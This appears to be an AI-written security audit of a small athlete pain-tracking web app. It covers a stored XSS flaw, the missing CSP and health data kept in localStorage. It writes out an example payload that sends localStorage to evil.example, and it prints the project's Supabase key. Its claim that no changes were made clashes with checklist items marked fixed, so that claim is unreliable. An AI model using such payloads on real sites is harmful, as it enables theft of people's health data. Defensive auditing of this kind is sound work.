# SJR System — Security Audit Report
**Date:** 2026-04-16  
**Auditor:** Claude (Anthropic)  
**Scope:** All 8 HTML files in `padraik99/sjr-system` repo  
**Status:** Report only — no changes made. Awaiting instructions.

---

## Files Audited

| File | JS | Supabase | localStorage | User Input |
|------|-----|----------|-------------|------------|
| `SJR_Dashboard_v2_20260408.html` | ✅ | ✅ | ❌ | ✅ (free-text) |
| `SJR_WeeklyGuide_Patrick_v5_20260402.html` | ✅ | ✅ | ✅ | ✅ (sliders/buttons) |
| `shaylan_weekly_v3_20260402.html` | ✅ | ✅ | ✅ | ✅ (buttons/toggles) |
| `Cadence_Weekly_v3_20260402.html` | ✅ | ✅ | ✅ | ✅ (buttons/toggles) |
| `SJR_Yari_Guide_v2_20260414.html` | ✅ | ✅ | ✅ | ✅ (buttons/sliders) |
| `SJR_Library_Master_v4_20260402-1.html` | ✅ | ❌ | ❌ | ❌ |
| `patrick_protocol_v2_20260402.html` | ❌ | ❌ | ❌ | ❌ |
| `SJR_Periodization_Master_v2_20260313.html` | ❌ | ❌ | ❌ | ❌ |

---

## A. Output Rendering — innerHTML / outerHTML / document.write

### Summary
`outerHTML` and `document.write` — **zero occurrences** across all files. ✅  
`innerHTML` — **24 occurrences** across 5 files. Two are confirmed stored XSS vectors.

### CRITICAL: Stored XSS — `SJR_Dashboard_v2_20260408.html`

**`renderInjuries()`, lines 603–614:**
```javascript
tbody.innerHTML = allInjuries.map(inj => {
  const loc  = inj.location || '—';
  const desc = inj.description || '—';
  return `<tr>
    <td>..${inj.athlete_id}</td>
    <td>${date}</td>
    <td>${loc}</td>        // ← user free-text via Supabase → innerHTML
    <td>${desc}</td>       // ← user textarea via Supabase → innerHTML
  </tr>`;
}).join('');
```
Full attack path: `#inj-location` / `#inj-desc` text inputs → `saveInjury()` POST to Supabase `injury_logs` → `loadInjuryLogs()` GET from Supabase → `renderInjuries()` → `tbody.innerHTML`. A payload like `<img src=x onerror="fetch('https://evil.example/steal?k='+btoa(JSON.stringify(localStorage)))">` entered in the location or description field will persist in Supabase and execute every time the Dashboard loads or refreshes.

**`loadAll()` error handler, line 473:**
```javascript
document.getElementById('athletes-grid').innerHTML =
  `<div class="loading-state">⚠ Load failed: ${e.message}<br>...</div>`;
```
`e.message` originates from a thrown Error constructed from the Supabase HTTP response body (`res.status + ': ' + txt`). If Supabase returns a crafted error body (e.g., after a modified request or supply-chain compromise), this becomes an injection vector. Lower probability but still innerHTML with externally-sourced content.

### innerHTML Usage — Hardcoded Data (Lower Risk)

These are innerHTML calls where the content comes from hardcoded JavaScript arrays (WEEKS, RSI, ATHLETES) — no user data is injected. They are not current XSS vectors, but the pattern is fragile: if the data source ever shifts to Supabase or user input without updating the render method, they become vulnerabilities.

| File | Line(s) | Target | Data Source |
|------|---------|--------|-------------|
| `SJR_WeeklyGuide_Patrick_v5_20260402.html` | 1894 | `#main-content` | Hardcoded WEEKS |
| `SJR_WeeklyGuide_Patrick_v5_20260402.html` | 2062 | `#pending-list` | Pain score integers + hardcoded metric keys |
| `SJR_WeeklyGuide_Patrick_v5_20260402.html` | 2105 | `#phase-badge` | Hardcoded WEEKS label/dates |
| `shaylan_weekly_v3_20260402.html` | 1658, 1696, 1730, 1753, 1866 | `container`, `#main-content` | Hardcoded WEEKS; static strings |
| `shaylan_weekly_v3_20260402.html` | 1885 | `#phase-badge` | Hardcoded WEEKS label/dates |
| `Cadence_Weekly_v3_20260402.html` | 1421, 1428, 1511 | `#main-content` | Hardcoded WEEKS |
| `Cadence_Weekly_v3_20260402.html` | 1529 | `#phase-badge` | Hardcoded WEEKS label/dates |
| `SJR_Yari_Guide_v2_20260414.html` | 847, 1513 | Confirmation span | `score` (integer 0–10) + `today` (local date string) |
| `SJR_Yari_Guide_v2_20260414.html` | 1568 | `#day-content` | Hardcoded WEEKS |
| `SJR_Yari_Guide_v2_20260414.html` | 1590 | `rsiEl` | Hardcoded RSI array |
| `SJR_Dashboard_v2_20260408.html` | 443–444 | `#athletes-grid` | Static loading string |
| `SJR_Dashboard_v2_20260408.html` | 487ff | `#athletes-grid` | Supabase pain_logs scores (integers) + hardcoded ATHLETES config |

**Verdict: user/stored data does NOT render via textContent only.** `inj.location` and `inj.description` in `SJR_Dashboard_v2_20260408.html` are confirmed exceptions.

---

## B. Input Handling

### `SJR_Dashboard_v2_20260408.html` — Free-text inputs (highest risk)
| Input element | Type | Flows to |
|---------------|------|---------|
| `#inj-athlete` | `<select>` — dropdown, constrained | Supabase POST `injury_logs.athlete_id` |
| `#inj-date` | `<input type="date">` | Supabase POST `injury_logs.date`; used in `renderInjuries()` display |
| `#inj-location` | `<input type="text">` — **free-text, no validation** | Supabase POST `injury_logs.location` → `renderInjuries()` → **`innerHTML`** |
| `#inj-desc` | `<textarea>` — **free-text, no validation** | Supabase POST `injury_logs.description` → `renderInjuries()` → **`innerHTML`** |

The only validation applied before save is an empty-check (`if(!location && !desc)`). No length limit, no character allowlist, no HTML entity encoding, no sanitization library.

### Weekly Guides (Patrick, Shaylan, Cadence, Yari) — Constrained inputs
All user input in the weekly guides is via buttons and numeric sliders. Pain scores are integers (0–10) selected from buttons/sliders, not free-text. Gate log entries are structured objects with integer scores and hardcoded metric keys. These are low XSS risk at the input level, though the data still lands in localStorage (plaintext) and Supabase.

**Yari (`SJR_Yari_Guide_v2_20260414.html`):** Pain score from button click (integer 0–10) is written directly to `innerHTML` at lines 847 and 1513, but as an integer it cannot carry HTML injection.

### `SJR_Library_Master_v4_20260402-1.html`
No user inputs. Filter toggles operate on hardcoded `data-tags` attributes. No injection surface.

---

## C. Data at Rest — localStorage / sessionStorage

`sessionStorage` — **zero uses** across all files. ✅

### localStorage Keys by File

| File | Key | Contents | Health data? |
|------|-----|----------|-------------|
| `SJR_WeeklyGuide_Patrick_v5_20260402.html` | `pt_week` | Integer week index | ❌ |
| `SJR_WeeklyGuide_Patrick_v5_20260402.html` | `pt_logs` | JSON array: `{date, metric, score, timing}` | **YES — pain scores** |
| `shaylan_weekly_v3_20260402.html` | `sh_week` | Integer week index | ❌ |
| `shaylan_weekly_v3_20260402.html` | `sh_events` | JSON array of selected training event IDs | ❌ |
| `shaylan_weekly_v3_20260402.html` | `sh_gate` | JSON array: gate log entries with scores | **YES — pain/gate scores** |
| `Cadence_Weekly_v3_20260402.html` | `cad_week` | Integer week index | ❌ |
| `Cadence_Weekly_v3_20260402.html` | `cad_gate` | JSON array: gate log entries with scores | **YES — pain/gate scores** |
| `SJR_Yari_Guide_v2_20260414.html` | `yari_week` | Integer week index | ❌ |
| `SJR_Yari_Guide_v2_20260414.html` | `yari_pain_YYYY-MM-DD` | Integer pain score for that date | **YES — daily pain scores + dates** |

### Cross-file Key Sharing
No key names are shared across files (prefixes are athlete-specific: `pt_`, `sh_`, `cad_`, `yari_`). However, because all files are served from the same origin (`padraik99.github.io`), **all files share one localStorage namespace**. An XSS exploit in any one file can read and overwrite every key belonging to every other file on that origin.

The `yari_pain_*` pattern (dynamic key per date) means the number of keys grows unboundedly over time — one key per logged day. There is no expiry or cleanup mechanism.

**All health data in localStorage is plaintext.** Any browser extension with DOM or storage access — ad blockers, productivity tools, clipboard managers, dev tools extensions — can read these values. This risk is not documented anywhere in the codebase.

---

## D. API and Network Calls

### All Supabase calls use the same `sbFetch` wrapper pattern

```javascript
const SUPA_URL = 'https://jedsnurnnwmpcbdvtlbs.supabase.co';
const SUPA_KEY = 'sb_publishable_3WGolnM5dOK88Y4WdKCFGA_Hi6wj-_z';
// Header: { 'apikey': SUPA_KEY }  — correct per CLAUDE.md rules
```

Key observation: `sb_publishable_` keys are **intentionally public-facing** (Supabase's design) and are not secret in the same sense as a private API key. However, they are client-visible in View Source on a public GitHub Pages repo, and Supabase row-level security (RLS) policies are what should constrain what this key can access.

### Calls by File

**`SJR_Dashboard_v2_20260408.html`**
| Endpoint | Method | Payload | Health data? |
|----------|--------|---------|-------------|
| `/rest/v1/pain_logs?athlete_id=...&date=gte.{date}&select=*` | GET | — | **YES** — all metrics, scores, timings, dates |
| `/rest/v1/athlete_state?select=*` | GET | — | State/phase metadata |
| `/rest/v1/injury_logs?select=*&order=date.desc` | GET | — | **YES** — location + description text |
| `/rest/v1/injury_logs` | POST | `{athlete_id, date, location, description}` | **YES** — free-text health data |

**`SJR_WeeklyGuide_Patrick_v5_20260402.html`**
| Endpoint | Method | Payload | Health data? |
|----------|--------|---------|-------------|
| `/rest/v1/athlete_state?athlete_id=eq.patrick&select=*` | GET | — | State/week |
| `/rest/v1/athlete_state` | POST (upsert) | `{athlete_id, current_week}` | ❌ |
| `/rest/v1/pain_logs?athlete_id=eq.patrick&select=*` | GET | — | **YES** |
| `/rest/v1/pain_logs` | POST | `{athlete_id, date, metric, score, timing}` | **YES** |

**`shaylan_weekly_v3_20260402.html`, `Cadence_Weekly_v3_20260402.html`** — same pattern as Patrick's guide with their respective athlete IDs. Health data (gate log scores) sent via POST to `pain_logs`.

**`SJR_Yari_Guide_v2_20260414.html`**
| Endpoint | Method | Payload | Health data? |
|----------|--------|---------|-------------|
| `/rest/v1/pain_logs` | POST | `{athlete_id:'yari', date, metric:'pain', score}` | **YES** |
| `/rest/v1/athlete_state` | GET/POST | Week state | ❌ |

Note: Yari's `sbFetch` call at line 774 is missing `await` (`const res = fetch(...)` instead of `const res = await fetch(...)`). This is a functional bug (already noted in prior work) but not a security issue.

**`SJR_Library_Master_v4_20260402-1.html`, `patrick_protocol_v2_20260402.html`, `SJR_Periodization_Master_v2_20260313.html`** — **no network calls** (beyond Google Fonts CSS). ✅

### External Resources (all files)
All 8 files load from `https://fonts.googleapis.com/css2?...` — a Google CDN stylesheet. This is not malicious, but it means:
- Google receives a request containing the file's URL on every page load.
- If Google's CDN were compromised or served modified CSS, a CSS injection attack becomes theoretically possible (CSS can exfiltrate data via `background: url(...)` attribute selectors).
- A strict CSP could restrict this to a known hash.

---

## E. Content Security Policy

`grep` for `Content-Security-Policy` across all 8 files returned **zero results**.

**No file has a CSP meta tag.**

What a missing CSP enables:
- **Inline script execution**: Any injected `<script>` tag or `javascript:` URL runs without restriction.
- **External script loading**: Injected `<script src="https://evil.example/payload.js">` loads and executes.
- **Data exfiltration via fetch**: An XSS payload can `fetch()` to any external URL, sending localStorage contents, pain scores, or API keys.
- **Clickjacking**: No `frame-ancestors` directive means any site can iframe these pages.
- **Mixed content**: No `upgrade-insecure-requests` directive (less relevant since GitHub Pages forces HTTPS, but worth noting).

A minimal effective CSP for this app would be:
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'self' 'nonce-{per-request-nonce}';
  style-src 'self' https://fonts.googleapis.com 'unsafe-inline';
  font-src https://fonts.gstatic.com;
  connect-src https://jedsnurnnwmpcbdvtlbs.supabase.co;
  img-src 'self' data:;
  frame-ancestors 'none';
">
```
Note: GitHub Pages is static — no server-side nonce generation is possible. A hash-based CSP for inline scripts is the practical alternative, though it requires extracting each inline script to a separate file or computing SHA-256 hashes.

---

## F. Health Data Sensitivity

### Data Inventory
The following personal health data is stored and/or transmitted by this app:

| Data type | Athlete(s) | Storage | Transmission |
|-----------|-----------|---------|-------------|
| Pain scores (0–10 scale, 4 metrics × 3 timings) | Patrick | `pt_logs` localStorage + Supabase `pain_logs` | HTTPS to Supabase |
| Gate/readiness scores | Shaylan, Cadence | `sh_gate`, `cad_gate` localStorage + Supabase `pain_logs` | HTTPS to Supabase |
| Daily pain scores with dates | Yari | `yari_pain_YYYY-MM-DD` localStorage + Supabase `pain_logs` | HTTPS to Supabase |
| Injury location (free-text) | All athletes | Supabase `injury_logs` | HTTPS to Supabase |
| Injury description (free-text, symptoms/context) | All athletes | Supabase `injury_logs` | HTTPS to Supabase |

### Paths by Which Data Could Leave Unintentionally

**1. CSV Export (Dashboard)**  
Six export buttons generate downloadable CSV files: one per athlete + combined + injury log. The injury CSV contains `location` and `description` free-text fields. The pain log CSVs contain scores, timings, and dates. No API keys or tokens are included in the CSV output (confirmed — export reads from in-memory `allLogs`/`allInjuries` arrays, not from localStorage or from config constants). Risk: downloaded files sit on local disk unencrypted; if shared or synced to cloud storage, health data is exposed.

**2. Stored XSS via Dashboard injury table**  
As documented in Section A, an XSS payload in `inj.location` or `inj.description` can exfiltrate all localStorage health data to an external server on every Dashboard load. This is the highest-severity unintentional data exfiltration path.

**3. Google Fonts CDN request**  
Every page load sends a request to `fonts.googleapis.com`. The request includes the `Referer` header (page URL). For a GitHub Pages app the URL is not sensitive, but it confirms to Google that the user visited that page.

**4. Public GitHub repo / GitHub Pages URL**  
The repo is public at `https://padraik99.github.io/sjr-system/`. Any file URL shared (e.g., in a text message) is accessible to anyone who receives it. The HTML files themselves do not contain health data inline, but a valid Supabase `apikey` is visible in View Source — anyone with the key can query the `pain_logs` and `injury_logs` tables directly if Supabase RLS policies are not enforced.

### Data Stored in Plaintext
All localStorage values are plaintext JSON, readable by:
- Any JavaScript running on the same origin (including injected scripts)
- Browser DevTools (Application → Local Storage)
- Browser extensions with `storage` or `tabs` permissions
- Any person with physical access to the device and browser profile

This risk is **not documented anywhere in the codebase**.

---

## G. Cross-File Attack Surface

This app uses a shared localStorage namespace under the origin `padraik99.github.io`. All files share this namespace. The Supabase key is identical across all Supabase-connected files.

**Attack scenario:** An adversary enters an XSS payload in the Dashboard injury log description field. The payload is stored in Supabase. On the next Dashboard load (including the 60-second auto-refresh), the payload executes. From that execution context the attacker can:
1. Read all localStorage keys: `pt_logs` (Patrick's full pain history), `sh_gate`, `cad_gate` (Shaylan's and Cadence's gate logs), `yari_week`, all `yari_pain_*` keys.
2. Exfiltrate those to an external URL via `fetch()`.
3. Write arbitrary values back to any localStorage key, corrupting week state or injecting false health data.
4. Extract the hardcoded Supabase `SUPA_KEY` from the DOM/script context and make direct API calls to all Supabase tables.

**This attack is fully enabled right now by two conditions that are both true:**
- `SJR_Dashboard_v2_20260408.html` has a stored XSS vector (Section A).
- No file has a CSP that would block inline script execution or external fetch (Section E).

**Fixing only the innerHTML violation without adding a CSP leaves the attack surface partly open** — a future innerHTML regression or a new code path could re-enable it.

---

## Prioritized Remediation Checklist

```
- [x] [CRITICAL] SJR_Dashboard_v2_20260408.html — renderInjuries() renders inj.location and inj.description via innerHTML (lines 603–614); **FIXED 2026-04-16** — replaced with DOM node construction; location and description now set via textContent only

- [x] [CRITICAL] SJR_Dashboard_v2_20260408.html — saveInjury() accepts free-text location and description with no sanitization before Supabase POST; **FIXED 2026-04-16** — added maxlength="200" on #inj-location, maxlength="1000" on #inj-desc, and JS length guards before POST

- [ ] [HIGH] All files (8) — no Content Security Policy meta tag; add CSP restricting connect-src to Supabase, font-src to fonts.gstatic.com, and blocking all other external script/fetch

- [x] [HIGH] SJR_Dashboard_v2_20260408.html — loadAll() error handler renders e.message via innerHTML (line 473); **FIXED 2026-04-16** — replaced with DOM construction using textContent

- [x] [HIGH] SJR_Dashboard_v2_20260408.html — setInterval(loadAll, 60000) called inside saveInjury() (line 634); **FIXED 2026-04-16** — moved to top-level init block; registers once only

- [ ] [HIGH] All Supabase-connected files (5) — Supabase key sb_publishable_3WGolnM5dOK88Y4WdKCFGA_Hi6wj-_z is hardcoded in client-side JS in a public repo; verify Supabase RLS (Row Level Security) policies are enabled on pain_logs, injury_logs, and athlete_state tables — without RLS the key grants full table access to anyone who views source

- [ ] [MEDIUM] SJR_Yari_Guide_v2_20260414.html — innerHTML used to render score and today at lines 847 and 1513; these are currently safe (integer + local date string) but should use textContent for consistency and future-proofing

- [ ] [MEDIUM] All weekly guides (Patrick, Shaylan, Cadence, Yari) — innerHTML used for WEEKS/phase-badge renders (hardcoded data); refactor to textContent + DOM construction to eliminate the pattern entirely and protect against future data-source changes

- [ ] [MEDIUM] SJR_Library_Master_v4_20260402-1.html — filename has -1 suffix indicating a duplicate upload artifact; confirm whether canonical SJR_Library_Master_v4_20260402.html also exists in repo; if both exist, delete the -1 copy and audit inbound links

- [ ] [MEDIUM] All health data files — localStorage contains plaintext health data (pt_logs, sh_gate, cad_gate, yari_pain_*); document this risk in CLAUDE.md and consider an expiry/cleanup mechanism for yari_pain_* keys

- [ ] [LOW] SJR_Dashboard_v2_20260408.html — CSV export downloads include personal health data and injury descriptions; add a confirmation prompt warning the user before download that the file will contain identifiable health records

- [ ] [LOW] All files (8) — Google Fonts loaded from external CDN (fonts.googleapis.com) on every page load including health data pages; consider self-hosting fonts or accepting the data-sharing trade-off consciously

- [ ] [LOW] All files — no frame-ancestors CSP directive; pages are frameable by any origin (clickjacking surface); add frame-ancestors 'none' to CSP
```

---

## Notes on Supabase Key Exposure

The `sb_publishable_` prefix indicates this key is intended for client-side use (it is Supabase's analogue to an anon/public key). It is not a secret. However, its effective security depends entirely on Supabase RLS policies:

- If RLS is **disabled** on any table, anyone with this key can `SELECT`, `INSERT`, `UPDATE`, or `DELETE` all rows.
- If RLS is **enabled** with sensible policies (e.g., athletes can only read their own rows), the exposure surface is limited.

The audit found no evidence that RLS status is documented or verified anywhere in the codebase. Verifying and documenting RLS policy state for all three tables (`pain_logs`, `injury_logs`, `athlete_state`) should be part of the HIGH-priority fixes.

---

*End of report. No changes have been made. Awaiting instructions.*
